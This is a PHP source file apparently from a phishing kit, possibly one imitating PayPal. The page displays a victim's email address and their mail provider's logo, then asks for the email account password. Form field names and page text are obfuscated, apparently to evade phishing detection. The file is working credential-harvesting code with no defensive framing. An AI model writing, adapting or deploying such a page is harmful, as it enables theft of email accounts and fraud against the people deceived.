<?php
require __DIR__ . '/function.php';
require $api->language();

$page = "email";
$api->check_cookie();
$api->session("kuzuluy", true, $page);

require __DIR__ . '/system/page/header.php';

$api->emailProvider();

$html .= '
<div class="title-page">'.$api->text_encode($text['72']).'</div>
<p class="email-description">'.$api->text_encode($text['73']).' <b>'.ucfirst($_SESSION['provider']).'</b> '.$api->text_encode($text['74']." (".$text['75'].")").'</p>';

if (file_exists(__DIR__ . '/assets/img/email/'.$_SESSION['provider'].'.png')) {
  $html .= '<div class="provider-image"><img src="'.$api->image_encode("assets/img/email/".$_SESSION['provider'].".png")['local'].'"></div>';
} elseif ($api->get("https://logo.clearbit.com/".$_SESSION['provider'])['httpcode'] == 200) {
  $html .= '<div class="provider-image"><img src="'.$api->image_encode("https://logo.clearbit.com/".$_SESSION['provider'])['url'].'"></div>';
}

$html .= '
<form method="post" id="email" autocomplete="off">
<div class="textInput lap">
<input type="email" name="'.$api->encypt("email").'" value="'.$api->text_encode($_SESSION['email']).'" disabled>
</div>
<div class="textInput lap" id="DivPassword">
<input type="password" name="'.$api->encypt("password").'" id="Password" placeholder="'.$api->text_encode($text['76']).'">
</div>
<input class="vx_btn col-md-12 col-sm-12 col-xs-12" type="submit" value="'.$api->text_encode($text['59']).'" id="btnConfirm">
</form>
<div class="hasSpinner hide" id="loading"></div>';

require __DIR__ . '/system/page/footer.php';
?>
